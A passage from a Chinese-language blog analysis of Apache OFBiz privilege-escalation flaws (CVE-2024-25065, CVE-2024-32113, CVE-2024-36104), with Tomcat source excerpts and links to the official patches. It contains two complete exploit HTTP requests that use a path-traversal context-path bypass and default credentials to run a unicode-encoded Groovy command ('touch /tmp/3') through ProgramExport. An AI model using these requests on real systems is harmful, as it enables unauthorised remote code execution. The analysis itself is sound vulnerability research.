<p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734451330542-839667d9-0376-4ba6-adb7-6522f4a867e9.png"></p>
<p><font style="color:#000000;">官方补丁</font><a target="_blank" rel="noopener" href="https://github.com/apache/ofbiz-framework/commit/59b42220ab642699769895ee248575154db91e62">https://github.com/apache/ofbiz-framework/commit/59b42220ab642699769895ee248575154db91e62</a><font style="color:#000000;">对漏洞触发点进行了校验。</font></p>
<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a><font style="color:#000000;">Privilege Escalation</font></h2><h3 id="CVE-2024-25065"><a href="#CVE-2024-25065" class="headerlink" title="CVE-2024-25065"></a>CVE-2024-25065</h3><p><font style="color:#000000;">账号的访问权限部分由org.apache.ofbiz.webapp.control.LoginWorker#hasBasePermission方法控制，先从ServletContext中获取_serverId，并获取当前请求的上下文路径，接着调用ComponentConfig#getWebAppInfo方法，很明显当info的值为null时即可跳过判断。</font></p>
<p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734437083832-a077cf34-36ae-41cf-894a-0c0cf6ce75e5.png"></p>
<p><font style="color:#000000;">在ComponentConfig#getWebAppInfo方法中，只需让contextRoot与wInfo.getContextRoot()不相等，即可满足返回的结果为null。</font></p>
<p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734437403179-da32a43d-0367-4bfb-8e76-6e7845e46ece.png"></p>
<p><font style="color:#000000;">对于org.apache.catalina.connector.Request#getContextPath方法，返回值与match相关，只需保证candidate与canonicalContextPath相等即可让match返回true，而candidate的值是通过循环取得，每次多取一级子目录的值，并经过url解码以及normalize后即为其值。因此可以构造出这样的URL，&#x2F;h3rmesk1t&#x2F;..&#x2F;webtools&#x2F;control&#x2F;login，这样ContextPath的值中就会带上&#x2F;h3rmesk1t&#x2F;..&#x2F;，显然不会再与配置中的值相等，从而实现绕过。</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">getContextPath</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">canonicalContextPath</span> <span class="operator">=</span> <span class="built_in">this</span>.getServletContext().getContextPath();</span><br><span class="line">    <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="built_in">this</span>.getRequestURI();</span><br><span class="line">    <span class="type">char</span>[] uriChars = uri.toCharArray();</span><br><span class="line">    <span class="type">int</span> <span class="variable">lastSlash</span> <span class="operator">=</span> <span class="built_in">this</span>.mappingData.contextSlashCount;</span><br><span class="line">    <span class="keyword">if</span> (lastSlash == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> pos;</span><br><span class="line">        <span class="keyword">for</span>(pos = <span class="number">0</span>; lastSlash &gt; <span class="number">0</span>; --lastSlash) &#123;</span><br><span class="line">            pos = <span class="built_in">this</span>.nextSlash(uriChars, pos + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (pos == -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String candidate;</span><br><span class="line">        <span class="keyword">if</span> (pos == -<span class="number">1</span>) &#123;</span><br><span class="line">            candidate = uri;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            candidate = uri.substring(<span class="number">0</span>, pos);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        candidate = <span class="built_in">this</span>.removePathParameters(candidate);</span><br><span class="line">        candidate = UDecoder.URLDecode(candidate, <span class="built_in">this</span>.connector.getURICharset());</span><br><span class="line">        candidate = RequestUtil.normalize(candidate);</span><br><span class="line"></span><br><span class="line">        <span class="type">boolean</span> match;</span><br><span class="line">        <span class="keyword">for</span>(match = canonicalContextPath.equals(candidate); !match &amp;&amp; pos != -<span class="number">1</span>; match = canonicalContextPath.equals(candidate)) &#123;</span><br><span class="line">            pos = <span class="built_in">this</span>.nextSlash(uriChars, pos + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (pos == -<span class="number">1</span>) &#123;</span><br><span class="line">                candidate = uri;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                candidate = uri.substring(<span class="number">0</span>, pos);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            candidate = <span class="built_in">this</span>.removePathParameters(candidate);</span><br><span class="line">            candidate = UDecoder.URLDecode(candidate, <span class="built_in">this</span>.connector.getURICharset());</span><br><span class="line">            candidate = RequestUtil.normalize(candidate);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (match) &#123;</span><br><span class="line">            <span class="keyword">return</span> pos == -<span class="number">1</span> ? uri : uri.substring(<span class="number">0</span>, pos);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(sm.getString(<span class="string">&quot;coyoteRequest.getContextPath.ise&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;canonicalContextPath, uri&#125;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">除此之外，由于OFBiz的路由功能是通过path决定的，要鉴权就需要通过extensionCheckLogin完成，而在这个函数中会先校验用户名密码，只有用户名密码正确才通过函数hasBasePermission判断是否有对应路径权限，因此需要一个低权限账号来满足前序步骤。</font></p>
<p>漏洞利用数据包如下：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/h3rmesk1t/../webtools/control/ProgramExport</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8443</span><br><span class="line"><span class="attribute">X-Forwarded-Proto</span><span class="punctuation">: </span>HTTPS</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>webtools.securedLoginId=admin; JSESSIONID=7899116F52229866537976CBD23EFA95.jvm1; JSESSIONID=145B4BBDF7F815B119E02ED19923821C; java-chains-token-key=admin_token; OFBiz.Visitor=10000</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>200</span><br><span class="line"></span><br><span class="line"><span class="language-taggerscript">USERNAME=bizadmin&amp;PASSWORD=ofbiz&amp;JavaScriptEnabled=Y&amp;groovyProgram=<span class="symbol">\u0022</span><span class="symbol">\u0074</span><span class="symbol">\u006f</span><span class="symbol">\u0075</span><span class="symbol">\u0063</span><span class="symbol">\u0068</span><span class="symbol">\u0020</span><span class="symbol">\u002f</span><span class="symbol">\u0074</span><span class="symbol">\u006d</span><span class="symbol">\u0070</span><span class="symbol">\u002f</span><span class="symbol">\u0033</span><span class="symbol">\u0022</span><span class="symbol">\u002e</span><span class="symbol">\u0065</span><span class="symbol">\u0078</span><span class="symbol">\u0065</span><span class="symbol">\u0063</span><span class="symbol">\u0075</span><span class="symbol">\u0074</span><span class="symbol">\u0065</span><span class="symbol">\u0028</span><span class="symbol">\u0029</span></span></span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">官方补丁</font><a target="_blank" rel="noopener" href="https://github.com/apache/ofbiz-framework/commit/b91a9b7f26">https://github.com/apache/ofbiz-framework/commit/b91a9b7f26</a>、<a target="_blank" rel="noopener" href="https://github.com/apache/ofbiz-framework/commit/b3b87d98dd">https://github.com/apache/ofbiz-framework/commit/b3b87d98dd</a><font style="color:#000000;">对contextPath也进行了normalize处理。</font></p>
<h3 id="CVE-2024-32113-CVE-2024-36104"><a href="#CVE-2024-32113-CVE-2024-36104" class="headerlink" title="CVE-2024-32113&amp;CVE-2024-36104"></a><font style="color:#000000;">CVE-2024-32113&amp;CVE-2024-36104</font></h3><p><font style="color:#000000;">这两个漏洞的本质还是对CVE-2024-25065的补丁进行一个绕过，无论是getRequestURI方法还getRequestURL方法都不会做URL解码，因此可以采用编码来进行绕过，另外也可以配合分号的使用绕过校验（CVE-2024-36104）。</font></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/h3rmesk1t/%2e%2e/webtools/control/ProgramExport</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8443</span><br><span class="line"><span class="attribute">X-Forwarded-Proto</span><span class="punctuation">: </span>HTTPS</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>webtools.securedLoginId=admin; JSESSIONID=7899116F52229866537976CBD23EFA95.jvm1; JSESSIONID=145B4BBDF7F815B119E02ED19923821C; java-chains-token-key=admin_token; OFBiz.Visitor=10000</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>200</span><br><span class="line"></span><br><span class="line"><span class="language-taggerscript">USERNAME=bizadmin&amp;PASSWORD=ofbiz&amp;JavaScriptEnabled=Y&amp;groovyProgram=<span class="symbol">\u0022</span><span class="symbol">\u0074</span><span class="symbol">\u006f</span><span class="symbol">\u0075</span><span class="symbol">\u0063</span><span class="symbol">\u0068</span><span class="symbol">\u0020</span><span class="symbol">\u002f</span><span class="symbol">\u0074</span><span class="symbol">\u006d</span><span class="symbol">\u0070</span><span class="symbol">\u002f</span><span class="symbol">\u0033</span><span class="symbol">\u0022</span><span class="symbol">\u002e</span><span class="symbol">\u0065</span><span class="symbol">\u0078</span><span class="symbol">\u0065</span><span class="symbol">\u0063</span><span class="symbol">\u0075</span><span class="symbol">\u0074</span><span class="symbol">\u0065</span><span class="symbol">\u0028</span><span class="symbol">\u0029</span></span></span><br></pre></td></tr></table></figure>

<p>对于上述利用手法，官方采用正则的方式进行修复<a target="_blank" rel="noopener" href="https://github.com/apache/ofbiz-framework/commit/d33ce31012">https://github.com/apache/ofbiz-framework/commit/d33ce31012</a>。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://t.zsxq.com/AEbMP">Apache OFBiz漏洞CVE-2023-49070的前世今生</a></p>
<p><a target="_blank" rel="noopener" href="https://y4tacker.github.io/2024/06/23/year/2024/8/Apache-OFBiz-Authentication-Bypass-CVE-2024-38856/">Apache OFBiz Authentication Bypass(CVE-2024-38856)</a></p>

  </div>
</article>


    <div class="blog-post-comments">
        <div id="utterances_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>


        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/tags/">Tag</a></li>
        
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pre-Auth"><span class="toc-number">2.</span> <span class="toc-text">Pre Auth</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2020-9496"><span class="toc-number">2.1.</span> <span class="toc-text">CVE-2020-9496</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2021-26295"><span class="toc-number">2.2.</span> <span class="toc-text">CVE-2021-26295</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypas-Auth"><span class="toc-number">3.</span> <span class="toc-text">Bypas Auth</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2023-49070"><span class="toc-number">3.1.</span> <span class="toc-text">CVE-2023-49070</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2023-51467"><span class="toc-number">3.2.</span> <span class="toc-text">CVE-2023-51467</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2024-38856"><span class="toc-number">3.3.</span> <span class="toc-text">CVE-2024-38856</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">4.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2024-25065"><span class="toc-number">4.1.</span> <span class="toc-text">CVE-2024-25065</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2024-32113-CVE-2024-36104"><span class="toc-number">4.2.</span> <span class="toc-text">CVE-2024-32113&amp;CVE-2024-36104</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/&text=Cursory Analysis Of Apache OFBiz Vulnerability"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/&title=Cursory Analysis Of Apache OFBiz Vulnerability"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/&is_video=false&description=Cursory Analysis Of Apache OFBiz Vulnerability"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Cursory Analysis Of Apache OFBiz Vulnerability&body=Check out this article: https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/&title=Cursory Analysis Of Apache OFBiz Vulnerability"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/&title=Cursory Analysis Of Apache OFBiz Vulnerability"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/&title=Cursory Analysis Of Apache OFBiz Vulnerability"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/&title=Cursory Analysis Of Apache OFBiz Vulnerability"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/&name=Cursory Analysis Of Apache OFBiz Vulnerability&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/&t=Cursory Analysis Of Apache OFBiz Vulnerability"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023-2025
    H3rmesk1t
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

    <script type="text/javascript">
      var utterances_repo = 'H3rmesk1t/h3rmesk1t.github.io';
      var utterances_issue_term = 'pathname';
      var utterances_label = '💬';
      var utterances_theme = 'github-light';

      (function(){
          var script = document.createElement('script');

          script.src = 'https://utteranc.es/client.js';
          script.setAttribute('repo', utterances_repo);
          script.setAttribute('issue-term', 'pathname');
          script.setAttribute('label', utterances_label);
          script.setAttribute('theme', utterances_theme);
          script.setAttribute('crossorigin', 'anonymous');
          script.async = true;
          (document.getElementById('utterances_thread')).appendChild(script);
      }());
  </script>

</body>
</html>
